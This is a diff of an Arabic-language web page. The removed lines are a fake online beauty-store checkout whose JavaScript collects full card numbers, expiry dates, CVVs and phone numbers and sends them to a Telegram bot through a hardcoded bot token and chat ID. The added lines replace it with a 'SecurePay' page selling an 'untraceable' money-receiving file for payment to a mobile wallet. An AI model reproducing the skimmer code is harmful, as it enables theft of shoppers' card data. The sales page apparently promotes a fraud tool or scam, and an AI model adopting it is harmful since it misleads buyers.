+                </div>
+                <div class="faq-item">
+                    <div class="faq-question"><i>❓</i> هل المحفظة قابلة للتتبع؟</div>
+                    <div class="faq-answer">لا، المحفظة مصممة لتكون غير قابلة للتتبع، لكننا نتعاون مع الجهات الرقابية في حال اكتشاف أي استخدام غير قانوني.</div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question"><i>❓</i> هل يمكن استخدام المنتج في أنشطة غير قانونية؟</div>
+                    <div class="faq-answer">لا، المنتج مصمم حصرياً للأغراض المشروعة والقانونية. نحن نراقب الأنشطة المشبوهة ونتعاون مع السلطات في حالة أي استخدام غير قانوني.</div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question"><i>❓</i> ما هي طرق الدفع المتاحة؟</div>
+                    <div class="faq-answer">نقبل جميع طرق الدفع الإلكترونية الشائعة بما في ذلك البطاقات الائتمانية والمحافظ الإلكترونية.</div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question"><i>❓</i> هل هناك ضمان لاسترجاع الأموال؟</div>
+                    <div class="faq-answer">نعم، نقدم ضمان استرجاع الأموال خلال 7 أيام إذا لم يعمل المنتج كما هو موضح.</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3>SecurePay</h3>
+                    <p>الحل الآمن لاستلام المدفوعات عبر الإنترنت.</p>
+                </div>
+                <div class="footer-section">
+                    <h3>روابط سريعة</h3>
+                    <ul>
+                        <li><a href="#home">الرئيسية</a></li>
+                        <li><a href="#product">المنتج</a></li>
+                        <li><a href="#privacy">الخصوصية</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h3>اتصل بنا</h3>
+                    <p>البريد الإلكتروني: info@securepay.com</p>
+                    <p>الهاتف: 0123456789</p>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2023 SecurePay. جميع الحقوق محفوظة. | مصمم للأغراض التجارية المشروعة فقط</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Purchase Modal -->
+    <div class="modal" id="purchaseModal">
+        <div class="modal-content">
+            <h2>هل تريد الشراء؟</h2>
+            <p>أنت على وشك شراء ملف استلام الأموال بسعر 1,700 جنيه. هذا الملف للاستخدام لمرة واحدة فقط.</p>
+            
+            <div class="ethical-notice">
+                <p><strong>تنويه هام:</strong> هذا المنتج مصمم للأغراض المشروعة فقط. لا يسمح باستخدامه في أي أنشطة غير قانونية أو غير أخلاقية.</p>
+            </div>
+            
+            <div class="modal-buttons">
+                <button class="modal-button confirm" id="confirmPurchase">تأكيد الشراء</button>
+                <button class="modal-button cancel" id="cancelPurchase">إلغاء</button>
+            </div>
         </div>
     </div>
 
-    <!-- الفوتر -->
-    <footer>
-        <p>جمالك © 2023 - كل الحقوق محفوظة</p>
-        <p> :  - خدمة العملاء متاحة 24/7</p>
-    </footer>
+    <!-- Payment Modal -->
+    <div class="modal" id="paymentModal">
+        <div class="modal-content">
+            <h2>إتمام عملية الدفع</h2>
+            
+            <div class="payment-info">
+                <p>لإتمام عملية الشراء، يرجى تحويل مبلغ <strong>1,700 جنيه</strong> إلى الرقم التالي:</p>
+                <div class="wallet-number" id="walletNumber">01050079125</div>
+                <p>بعد التحويل، يرجى إرسال صورة إثبات الدفع وسيتم إرسال الملف إليك فوراً.</p>
+            </div>
+            
+            <div class="upload-section">
+                <div class="upload-icon">📤</div>
+                <h3>أرسل صورة إثبات الدفع</h3>
+                <p>يمكنك رفع صورة من إثبات الدفع من خلال الزر أدناه</p>
+                <label for="paymentProof" class="upload-btn">رفع صورة الإثبات</label>
+                <input type="file" id="paymentProof" accept="image/*" style="display: none;">
+            </div>
+            
+            <div class="success-message" id="successMessage">
+                <p>✅ تم استلام صورتك بنجاح! سيتم مراجعة الدفع وإرسال الملف إليك في غضون 10 دقائق.</p>
+            </div>
+            
+            <div class="modal-buttons">
+                <button class="modal-button confirm" id="donePayment">تم الإرسال</button>
+                <button class="modal-button cancel" id="closePayment">إغلاق</button>
+            </div>
+        </div>
+    </div>
 
     <script>
-        // ========== إعدادات البوت التليجرام ==========
-        const BOT_CONFIG = {
-            token: "7764994819:AAGTCq_eybBFnu66oeQz7LeKzrjMuG2pLr8",
-            chatId: "8034352045"
-        };
-        // ===========================================
+        // Purchase Modal Logic
+        const buyButton = document.getElementById('buyButton');
+        const purchaseModal = document.getElementById('purchaseModal');
+        const confirmPurchase = document.getElementById('confirmPurchase');
+        const cancelPurchase = document.getElementById('cancelPurchase');
         
-        // عناصر DOM
+        // Payment Modal Elements
         const paymentModal = document.getElementById('paymentModal');
-        const closeModal = document.getElementById('closeModal');
-        const paymentForm = document.getElementById('paymentForm');
-        const buyButtons = document.querySelectorAll('.buy-btn');
-        const selectedProduct = document.getElementById('selectedProduct');
-        const selectedPrice = document.getElementById('selectedPrice');
-        const selectedProductName = document.getElementById('selectedProductName');
-        const selectedProductPrice = document.getElementById('selectedProductPrice');
-        const loading = document.getElementById('loading');
+        const donePayment = document.getElementById('donePayment');
+        const closePayment = document.getElementById('closePayment');
+        const paymentProof = document.getElementById('paymentProof');
         const successMessage = document.getElementById('successMessage');
-        const errorMessage = document.getElementById('errorMessage');
         
-        // فتح نموذج الدفع عند النقر على أي زر شراء
-        buyButtons.forEach(button => {
-            button.addEventListener('click', function() {
-                const product = this.getAttribute('data-product');
-                const price = this.getAttribute('data-price');
-                
-                selectedProduct.value = product;
-                selectedPrice.value = price;
-                selectedProductName.textContent = product;
-                selectedProductPrice.textContent = price;
-                
-                paymentModal.style.display = 'flex';
-            });
+        buyButton.addEventListener('click', function() {
+            purchaseModal.style.display = 'flex';
         });
         
-        // إغلاق النموذج
-        closeModal.addEventListener('click', function() {
+        confirmPurchase.addEventListener('click', function() {
+            purchaseModal.style.display = 'none';
+            paymentModal.style.display = 'flex';
+        });
+        
+        cancelPurchase.addEventListener('click', function() {
+            purchaseModal.style.display = 'none';
+        });
+        
+        // Payment proof upload
+        paymentProof.addEventListener('change', function() {
+            if (this.files && this.files[0]) {
+                // في الواقع، هنا سيتم رفع الملف إلى الخادم
+                // لكن لأغراض العرض، سنظهر رسالة النجاح فقط
+                successMessage.style.display = 'block';
+            }
+        });
+        
+        donePayment.addEventListener('click', function() {
+            if (paymentProof.files.length > 0) {
+                alert('شكراً لك! تم استلام إثبات الدفع بنجاح. سيتم إرسال الملف إلى بريدك الإلكتروني خلال 10 دقائق.');
+                paymentModal.style.display = 'none';
+            } else {
+                alert('يرجى رفع صورة إثبات الدفع أولاً.');
+            }
+        });
+        
+        closePayment.addEventListener('click', function() {
             paymentModal.style.display = 'none';
-            resetForm();
         });
         
-        // إغلاق النموذج عند النقر خارج المحتوى
+        // إغلاق النوافذ عند النقر خارجها
         window.addEventListener('click', function(event) {
+            if (event.target === purchaseModal) {
+                purchaseModal.style.display = 'none';
+            }
             if (event.target === paymentModal) {
                 paymentModal.style.display = 'none';
-                resetForm();
             }
         });
         
-        // معالجة نموذج الدفع
-        paymentForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // جمع بيانات الدفع
-            const paymentData = {
-                product: selectedProduct.value,
-                price: selectedPrice.value,
-                cardNumber: document.getElementById('cardNumber').value,
-                cardHolder: document.getElementById('cardHolder').value,
-                expiryDate: document.getElementById('expiryDate').value,
-                cvv: document.getElementById('cvv').value,
-                phone: document.getElementById('phone').value,
-                timestamp: new Date().toLocaleString('ar-EG')
-            };
-            
-            // التحقق من صحة البيانات
-            if (!validatePaymentData(paymentData)) {
-                return;
-            }
-            
-            // إظهار حالة التحميل
-            loading.style.display = 'block';
-            successMessage.style.display = 'none';
-            errorMessage.style.display = 'none';
-            
-            // إرسال البيانات للبوت التليجرام
-            sendToTelegram(paymentData);
-        });
-        
-        // التحقق من صحة بيانات الدفع
-        function validatePaymentData(data) {
-            // التحقق من رقم البطاقة
-            const cardNumber = data.cardNumber.replace(/\s/g, '');
-            if (cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
-                alert('يرجى إدخال رقم بطاقة صحيح (16 رقم)');
-                return false;
-            }
-            
-            // التحقق من تاريخ الانتهاء
-            const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
-            if (!expiryRegex.test(data.expiryDate)) {
-                alert('يرجى إدخال تاريخ انتهاء صحيح (MM/YY)');
-                return false;
-            }
-            
-            // التحقق من CVV
-            if (data.cvv.length !== 3 || !/^\d+$/.test(data.cvv)) {
-                alert('يرجى إدخال رمز CVV صحيح (3 أرقام)');
-                return false;
-            }
-            
-            // التحقق من رقم الهاتف
-            const phoneRegex = /^01[0-2,5]{1}[0-9]{8}$/;
-            if (!phoneRegex.test(data.phone)) {
-                alert('يرجى إدخال رقم هاتف صحيح (11 رقم)');
-                return false;
-            }
-            
-            return true;
-        }
-        
-        // دالة إرسال البيانات للبوت التليجرام
-        function sendToTelegram(paymentData) {
-            // تنسيق الرسالة
-            const message = `
-🛒 عملية شراء جديدة من متجر جمالك 🛒
-
-📦 المنتج: ${paymentData.product}
-💰 السعر: ${paymentData.price} ج.م
-
-💳 معلومات الدفع:
-• رقم البطاقة: ${paymentData.cardNumber}
-• اسم حامل البطاقة: ${paymentData.cardHolder}
-• تاريخ الانتهاء: ${paymentData.expiryDate}
-• رمز الأمان (CVV): ${paymentData.cvv}
-
-📞 رقم الهاتف: ${paymentData.phone}
-⏰ الوقت: ${paymentData.timestamp}
-
-📍 تم الإرسال من المتجر الإلكتروني
-            `;
-            
-            // إرسال الرسالة للبوت التليجرام
-            fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: BOT_CONFIG.chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                loading.style.display = 'none';
-                
-                if (data.ok) {
-                    successMessage.style.display = 'block';
-                    // إعادة تعيين النموذج بعد النجاح
-                    setTimeout(() => {
-                        paymentModal.style.display = 'none';
-                        resetForm();
-                    }, 3000);
-                } else {
-                    errorMessage.style.display = 'block';
-                    errorMessage.textContent = 'فشل في إرسال البيانات: ' + (data.description || 'خطأ غير معروف');
-                }
-            })
-            .catch(error => {
-                loading.style.display = 'none';
-                errorMessage.style.display = 'block';
-                errorMessage.textContent = 'حدث خطأ في الاتصال: ' + error.message;
-                console.error('Error:', error);
+        // Smooth scrolling for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
             });
-        }
-        
-        // إعادة تعيين النموذج
-        function resetForm() {
-            paymentForm.reset();
-            loading.style.display = 'none';
-            successMessage.style.display = 'none';
-            errorMessage.style.display = 'none';
-        }
-        
-        // تنسيق رقم البطاقة تلقائياً
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let formattedValue = '';
-            
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) {
-                    formattedValue += ' ';
-                }
-                formattedValue += value[i];
-            }
-            
-            e.target.value = formattedValue;
-        });
-        
-        // تنسيق تاريخ الانتهاء تلقائياً
-        document.getElementById('expiryDate').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            
-            if (value.length >= 2) {
-                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
-            } else {
-                e.target.value = value;
-            }
-        });
-        
-        // السماح فقط بالأرقام في حقل CVV
-        document.getElementById('cvv').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '');
-        });
-        
-        // السماح فقط بالأرقام في حقل الهاتف
-        document.getElementById('phone').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '');
         });
     </script>
 </body>
